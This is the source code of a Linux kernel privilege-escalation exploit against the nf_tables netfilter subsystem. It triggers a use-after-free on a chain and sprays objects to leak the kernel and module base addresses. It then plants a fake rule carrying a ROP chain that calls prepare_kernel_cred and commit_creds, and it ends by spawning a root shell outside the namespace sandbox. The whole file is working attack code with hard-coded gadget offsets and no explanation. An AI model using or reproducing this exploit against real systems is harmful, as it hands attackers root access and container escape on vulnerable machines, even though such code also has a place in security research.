#include "common.h"
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <cstring>
#include <fstream>

constexpr uint64_t PUSH_RSI_JMP_PTR_RSI_41 = 0x2d43db; // push rsi ; jmp qword ptr [rsi + 0x41]
constexpr uint64_t POP_RSP_RCX_RET = 0x1246a0; // pop rsp ; pop rcx ; ret
constexpr uint64_t POP_RDI_RET = 0x9110d; // pop rdi ; ret
constexpr uint64_t PREPARE_KERNEL_CRED = 0xe8750; // prepare_kernel_cred
constexpr uint64_t POP_RDX_RET = 0x26f2f2; // pop rdx ; ret
constexpr uint64_t CMP_RDX_1_JNE_RET = 0x353857; // cmp rdx, 1 ; jne 0xffffffff8135385e ; ret
constexpr uint64_t POP_R13_RBP_RET = 0x31c1; // pop r13 ; pop rbp ; ret
constexpr uint64_t MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET = 0x628fd4; // mov rdi, rax ; jne 0xffffffff81628fc1 ; xor eax, eax ; ret
constexpr uint64_t COMMIT_CREDS = 0xe8490; // commit_creds
constexpr uint64_t KPTI_TRAMPOLINE = 0xe00ff0 + 0x1b; // swapgs_restore_regs_and_return_to_usermode + offset

uint64_t iter, user_cs, user_ss, user_rflags, user_sp;
char **env;

void monke()
{
    INFO("Return to monke");
    setns(open("/proc/1/ns/user", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);
    const char *args[] = {"/bin/bash", "-i", NULL};
    execve(args[0], (char **)args, env);
}

void save_state()
{
    __asm__
    (
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    INFO("Saved state");
}

void setup()
{
    INFO("Setting up namespace sandbox");

    if (unshare(CLONE_NEWUSER) == -1)
        ERROR("unshare(CLONE_NEWUSER");

    if (unshare(CLONE_NEWNET) == -1)
        ERROR("unshare(CLONE_NEWNET)");
    
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);
    if (sched_setaffinity(getpid(), sizeof(set), &set) == -1)
        ERROR("sched_setaffinity");
}

void trigger_uaf(MNLSocket &nl)
{
    INFO("Triggering UAF");

    ++iter;

    std::string victim_name = std::to_string(iter) + "_victim";
    std::string immhost_name = std::to_string(iter) + "_immhost";

    NFChain victim, c_immhost;
    NFImmediate imm;
    NFRule attacker, r_immhost;

    victim.set_table("t").set_name(victim_name.c_str());
    c_immhost.set_table("t").set_name(immhost_name.c_str());
    imm.set_dreg(NFT_REG_VERDICT).set_verdict(NFT_GOTO).set_chain(victim_name.c_str());
    attacker.set_family(NFPROTO_INET).set_table("t").set_chain(immhost_name.c_str()).set_id(0x1337);
    r_immhost.set_family(NFPROTO_INET).set_table("t").set_chain(immhost_name.c_str()).add_expr(imm);

    NFBatch b;
    b.start().add(victim).add(c_immhost).add(r_immhost).add(attacker).del(attacker.set_chain(victim_name.c_str())).del(victim).end();
    b.send(nl);
    b.run_all_cb(nl);

    sleep(1);
}

void spray_objects(MNLSocket &nl, const void *data, uint32_t len)
{
    INFO("Spraying objects");

    static constexpr int OBJ_COUNT = 1024;
    static constexpr int OBJ_PER_BATCH = 8;
    static constexpr int OBJ_SPRAY_BATCHES = OBJ_COUNT / OBJ_PER_BATCH;

    for (int i = 0; i < OBJ_SPRAY_BATCHES; ++i)
    {
        NFBatch b;
        b.start();

        for (int j = 0; j < OBJ_PER_BATCH; ++j)
        {
            NFObject o;
            std::string objname = std::to_string(iter) + std::to_string(i * OBJ_PER_BATCH + j);
            o.set_family(NFPROTO_INET).set_table("ts").set_name(objname.c_str()).set_type(NFT_OBJECT_COUNTER).set_udata(data, len);
            b.add(o);
        }

        b.end();
        b.send(nl);
        b.run_all_cb(nl);
    }
}

std::string dump_imm_name(MNLSocket &nl)
{
    std::string s;
    std::string immhost_name = std::to_string(iter) + "_immhost";
    NFRule r;

    r.set_family(NFPROTO_INET).set_table("t").set_chain(immhost_name.c_str());

    NFDumper::dump(r, nl, [](const struct nlmsghdr *nlh, void *data) -> int {
        auto r = nftnl_rule_alloc();

        if (nftnl_rule_nlmsg_parse(nlh, r) < 0)
            ERROR("nftnl_rule_nlmsg_parse");

        if (nftnl_expr_foreach(r, [](nftnl_expr *e, void *data) -> int {
            auto s = nftnl_expr_get_str(e, NFTNL_EXPR_IMM_CHAIN);
            if (s != nullptr)
            {
                std::string *str = (std::string *)data;
                str->append(s, strlen(s));
            }
            return 0;
        }, data) < 0)
            ERROR("nftnl_expr_foreach");

        nftnl_rule_free(r);
        return MNL_CB_OK;
    }, &s);
    
    return s;
}

std::string leak_sz_at(MNLSocket &nl, uint64_t addr)
{
    INFO("Trying to leak data at 0x%016lx", addr);

    char spray_data[128] = {0};
    *(uint64_t *)(spray_data + 0x58) = addr;

    trigger_uaf(nl);
    spray_objects(nl, spray_data, sizeof(spray_data));
    return dump_imm_name(nl);
}

int main(int argc, char **argv, char **envp)
{
    setup();

    {
        pid_t pid = fork();
        if (pid == 0)
        {
            setsid();
            close(0);
            close(1);
            close(2);
            while (1)
                sleep(1000);
        }
    }

    env = envp;
    save_state();

    INFO("Opening netfilter socket");

    MNLSocket nl(NETLINK_NETFILTER);
    
    INFO("Setup netfilter table");

    {
        NFTable t, ts;
        NFChain c;
        NFObject o;
        NFSet s;

        t.set_family(NFPROTO_INET).set_name("t");
        ts.set_family(NFPROTO_INET).set_name("ts");
        o.set_family(NFPROTO_INET).set_table("t").set_name("o").set_type(NFT_OBJECT_COUNTER);
        c.set_table("t").set_name("c");
        s.set_family(NFPROTO_INET).set_table("t").set_name("s").set_id(1).set_key_len(4).set_flags(NFT_SET_OBJECT).set_obj_type(NFT_OBJECT_COUNTER);

        NFBatch b;
        b.start().add(t).add(ts).add(o).add(c).add(s).end();
        b.send(nl);
        b.run_all_cb(nl);
    }

    trigger_uaf(nl);

    INFO("Spray rules to reclaim freed chain");

    constexpr int RULES_PER_BATCH = 8;
    constexpr int RULES_TOTAL = 1024;
    constexpr int RULES_BATCH_COUNT = RULES_TOTAL / RULES_PER_BATCH;

    for (int i = 0; i < RULES_BATCH_COUNT; ++i)
    {
        NFBatch b;
        b.start();

        for (int j = 0; j < RULES_PER_BATCH; ++j)
        {
            NFRule rs;
            NFObjRef es1, es2, es3;
            
            es1.set_set_name("s").set_set_sreg(NFT_REG32_00);
            es2.set_imm_name("o").set_imm_type(NFT_OBJECT_COUNTER);
            es3.set_imm_name("o").set_imm_type(NFT_OBJECT_COUNTER);
            rs.set_family(NFPROTO_INET).set_table("t").set_chain("c").add_expr(es1).add_expr(es2).add_expr(es3);

            b.add(rs);
        }

        b.end();
        b.send(nl);
        b.run_all_cb(nl);
    }

    INFO("Leak table address");
    uint64_t table;

    {
        std::string s = dump_imm_name(nl);        
        if (s.size() < 8)
            ERROR("Table address leak failed")
        table = *(uint64_t*)s.data() - 0xb8;
    }

    INFO("table = 0x%016lx", table);

    INFO("Leak nf_tables.ko base");
    uint64_t nf_tables_ko;

    {
        std::string s = leak_sz_at(nl, table + 0x30);
        if (s.size() < 8)
            ERROR("nf_tables.ko base leak failed")
        nf_tables_ko = *(uint64_t*)s.data() - 0xb70;
    }

    INFO("nf_tables.ko = 0x%016lx", nf_tables_ko);

    INFO("Leak kernel base");
    uint64_t vmlinux;

    {
        std::string s = leak_sz_at(nl, nf_tables_ko + 0xfee);
        if (s.size() < 4)
            ERROR("Kernel base leak failed")
        vmlinux = (0xffffffff00000000ull | ((uint32_t)nf_tables_ko + 0xff2u + *(uint32_t*)s.data())) - 0x338520;
    }

    INFO("vmlinux = 0x%016lx", vmlinux);

    struct nft_expr_ops
    {
        void (*eval)();
        int (*clone)();
        unsigned int size;
        int (*init)();
        void (*activate)();
        void (*deactivate)();
        void (*destroy)();
        void (*destroy_clone)();
        int (*dump)();
        int (*validate)();
        bool (*gc)();
        int (*offload)();
        bool (*offload_action)();
        void (*offload_stats)();
        const struct nft_expr_type *type;
        void *data;
    };

    INFO("Crafting fake expr ops");

    {
        char expr_ops[256] = {0};
        struct nft_expr_ops *ops = (struct nft_expr_ops *)expr_ops;

        ops->size = 0x8;
        *(uint64_t*)&ops->validate = vmlinux + PUSH_RSI_JMP_PTR_RSI_41;

        NFSet s;
        s.set_family(NFPROTO_INET).set_table("t").set_name("s_expr_ops").set_id(2).set_key_len(4).set_udata(expr_ops, sizeof(expr_ops));

        NFBatch b;
        b.start().add(s).end();
        b.send(nl);
        b.run_all_cb(nl);
    }

    INFO("Leak fake expr ops address");
    uint64_t expr_ops_addr;
    {
        std::string s = leak_sz_at(nl, table + 0xb1);
        if (s.size() < 7)
            ERROR("Fake expr ops address leak failed");
        s.insert(s.begin(), '\x00');
        expr_ops_addr = *(uint64_t*)s.data() + 0x1d0;
    }

    INFO("expr_ops_addr = 0x%016lx", expr_ops_addr);

    INFO("Crafting fake rule");

    {
        char fake_rule[256] = {0};
        struct nft_rule
        {
            void *next;
            void *prev;
            uint64_t handle : 42;
            uint64_t genmask : 2;
            uint64_t dlen : 12;
            uint64_t udata : 1;
            uint64_t data[];
        } *r = (nft_rule *)fake_rule;

        r->dlen = 8;
        *(uint64_t *)((char *)r->data) = expr_ops_addr;
        *(uint64_t *)(((char *)r->data) + 0x41) = vmlinux + POP_RSP_RCX_RET;

        uint64_t *rop = (uint64_t *)(((char *)r->data) + 0x8);
        
        *rop++ = vmlinux + POP_RDI_RET;
        rop++;
        *rop++ = vmlinux + PREPARE_KERNEL_CRED;
        *rop++ = vmlinux + POP_RDX_RET;
        *rop++ = 0x1;
        *rop++ = vmlinux + CMP_RDX_1_JNE_RET;

        *rop++ = vmlinux + POP_R13_RBP_RET;
        rop++;
        rop++;

        *rop++ = vmlinux + MOV_RDI_RAX_JNE_XOR_EAX_EAX_RET;
        *rop++ = vmlinux + COMMIT_CREDS;
       
        *rop++ = vmlinux + KPTI_TRAMPOLINE;
        rop++;
        rop++;
        *rop++ = (uint64_t)monke;
        *rop++ = user_cs;
        *rop++ = user_rflags;
        *rop++ = user_sp;
        *rop++ = user_ss;

        NFSet s;
        s.set_family(NFPROTO_INET).set_table("t").set_name("s_rule").set_id(3).set_key_len(4).set_udata(fake_rule, sizeof(fake_rule));

        NFBatch b;
        b.start().add(s).end();
        b.send(nl);
        b.run_all_cb(nl);
    }

    INFO("Leak fake rule address");
    uint64_t fake_rule_addr;
    
    {
        std::string s = leak_sz_at(nl, table + 0xb1);
        if (s.size() < 7)
            ERROR("Fake rule address leak failed");
        s.insert(s.begin(), '\x00');
        fake_rule_addr = *(uint64_t*)s.data() + 0x1d0;
    }

    INFO("fake_rule_addr = 0x%016lx", fake_rule_addr);

    INFO("Preparing for RIP control");
    
    {
        INFO("Triggering UAF");

        ++iter;

        std::string victim_name = std::to_string(iter) + "_victim";
        std::string immhost_name = std::to_string(iter) + "_immhost";

        NFChain victim, c_immhost, c_control;
        NFImmediate imm, imm_control;
        NFRule attacker, r_immhost, r_control;

        victim.set_table("t").set_name(victim_name.c_str());
        c_immhost.set_table("t").set_name(immhost_name.c_str());
        c_control.set_table("t").set_name("control").set_flags(NFT_CHAIN_BASE).set_hooknum(NF_INET_FORWARD).set_priority(0);
        imm.set_dreg(NFT_REG_VERDICT).set_verdict(NFT_GOTO).set_chain(victim_name.c_str());
        imm_control.set_dreg(NFT_REG_VERDICT).set_verdict(NFT_GOTO).set_chain(immhost_name.c_str());
        attacker.set_family(NFPROTO_INET).set_table("t").set_chain(immhost_name.c_str()).set_id(0x1337);
        r_immhost.set_family(NFPROTO_INET).set_table("t").set_chain(immhost_name.c_str()).add_expr(imm);
        r_control.set_family(NFPROTO_INET).set_table("t").set_chain("control").add_expr(imm_control);

        NFBatch b;
        b.start().add(victim).add(c_immhost).add(c_control).add(r_control).add(r_immhost).add(attacker).del(attacker.set_chain(victim_name.c_str())).del(victim).end();
        b.send(nl);
        b.run_all_cb(nl);

        sleep(1);

        char fake_chain[128] = {0};
        *(uint64_t*)(fake_chain + 0x10) = fake_rule_addr;
        spray_objects(nl, fake_chain, sizeof(fake_chain));
    }

    INFO("RIP control");

    {
        NFImmediate imm;
        NFRule r;

        imm.set_dreg(NFT_REG_VERDICT).set_verdict(NFT_RETURN);
        r.set_family(NFPROTO_INET).set_table("t").set_chain("c").add_expr(imm);

        NFBatch b;
        b.start().add(r).end();
        b.send(nl);
    }
}
